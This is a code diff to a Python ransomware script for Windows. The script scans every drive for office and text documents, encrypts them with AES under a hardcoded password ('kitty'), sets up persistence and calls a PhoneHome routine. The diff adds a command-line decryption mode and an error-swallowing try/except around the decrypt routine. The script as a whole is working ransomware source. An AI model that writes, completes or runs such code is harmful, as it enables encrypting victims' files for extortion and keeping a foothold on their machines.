@@ -8,6 +8,7 @@ import sys
 import win32api
 import zlib
 import base64
+import argparse
 
 from _winreg import *
 from Crypto.PublicKey import RSA
@@ -93,23 +94,24 @@ def DecryptDocument(document_path):
 	chunk_size = 16 * 1024
 	
 	plain_text = ''
-	cipher_text = ''
-	
-	with open(document_path, 'rb') as doc:
-		orig_size = struct.unpack('<Q', doc.read(struct.calcsize('Q')))[0]
-		IV = doc.read(16)
-		decryptor = AES.new(aes_key, AES.MODE_CBC, IV)
-		
-		while True:
-			chunk = doc.read(chunk_size)
-			if len(chunk) == 0:
-				break
-			plain_text = decryptor.decrypt(chunk)
-				
-	with open(document_path, 'wb') as doc:
-		doc.write(plain_text)
-		doc.truncate(orig_size)
-		
+
+	try:
+		with open(document_path, 'rb') as doc:
+			orig_size = struct.unpack('<Q', doc.read(struct.calcsize('Q')))[0]
+			IV = doc.read(16)
+			decryptor = AES.new(aes_key, AES.MODE_CBC, IV)
+			
+			while True:
+				chunk = doc.read(chunk_size)
+				if len(chunk) == 0:
+					break
+				plain_text = decryptor.decrypt(chunk)
+					
+		with open(document_path, 'wb') as doc:
+			doc.write(plain_text)
+			doc.truncate(orig_size)
+	except:
+		pass
 		
 def PhoneHome():
 
@@ -182,17 +184,27 @@ def GetDriveLetters():
 	
 
 if __name__ == '__main__':
-
+	parser = argparse.ArgumentParser(description='', epilog='')
+	parser.add_argument('--decrypt', help='')
+	args = parser.parse_args()
+	
 	target_extensions = ['.txt', '.docx', '.doc', '.xls', '.xlsx', '.ppt', '.pptx']
 	
-	aes_key = GenerateAESKey('kitty')
+	if args.decrypt:
+		aes_key = GenerateAESKey(args.decrypt)
+	else:
+		aes_key = GenerateAESKey('kitty')
 
 	drives = GetDriveLetters()
 	
 	for drive in drives:
 		docs = FindDocuments(drive)
 		for doc in docs:
-			EncryptDocument(doc)
+			if args.decrypt:
+				DecryptDocument(doc)
+				continue
+			else:
+				EncryptDocument(doc)
 			
 	ObtainPersistence()
 	
